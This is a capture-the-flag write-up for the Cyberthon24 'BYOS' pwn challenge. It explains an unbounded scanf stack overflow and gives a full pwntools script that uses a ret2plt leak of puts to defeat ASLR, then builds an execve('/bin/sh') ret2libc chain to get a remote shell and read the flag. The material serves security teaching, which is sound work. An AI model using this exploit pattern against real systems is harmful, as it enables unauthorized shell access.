# BYOS

## Problem Statement

Four. Times. In. A. Row. Okay that's it, i'm just going to remove almost all functionalities in my program. Can't
exploit it if there's nothing to exploit right?

Interact with the service at: `chals.t.cyberthon24.ctf.sg:33021`

Concept(s) Required:

- Address Space Layout Randomization
- Global Offset Table
- [Ret2Libc](https://blog.vero.site/post/baby-boi)

Note: once you get a shell, the flag.txt can be found in the user's home directory.

## Solution

Inspecting the source file,

```c
int main()
{
    char input[256];

   ...

    scanf("%s", input);
}
```

Another buffer overflow. But this time, we have to call for the shell ourselves through `libc`. They have also
conveniently given us the `libc` that the binary was compiled with.
ASLR is enabled, so we're going to have to leak ASLR base somehow, and the only logical way is a `ret2plt`.

`ret2plt` is a common technique that involves calling `puts@plt` and passing the GOT entry of puts as a parameter. This
causes puts to print out its own address in libc. You can then use it to calculate the offset of `libc` in memory, and
hence obtain the address of `execve` or `system`. You then set the return address to the function you are exploiting in
order to call it again and enable you to actually call for the shell.

First, we find the instruction pointer offset, then the libc offset, and finally call `execve` to give ourselves
shell. `pwntools` is extremely helpful for this:

```python
from pwn import *

elf = context.binary = ELF("./byos", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

p = process()
p.sendlineafter(b'=> ', cyclic(500))
p.wait()

offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
log.success("IP Offset: {}".format(offset))

r = remote("chals.t.cyberthon24.ctf.sg", 33021)

rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.raw(elf.sym['main'])
payload = flat({offset: rop.chain()})

r.sendlineafter(b'=> ', payload)

puts_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
log.success("Puts address: {}".format(hex(puts_addr)))
libc.address = puts_addr - libc.sym['puts']
log.success("LIBC address: {}".format(hex(libc.address)))

rop = ROP([elf, libc])
bin_sh = next(libc.search(b"/bin/sh\x00"))
rop.execve(bin_sh, 0, 0)
payload = flat({offset: rop.chain()})

r.sendlineafter(b'=> ', payload)
r.sendline(b'cat home/byos/flag.txt')

r.interactive()
```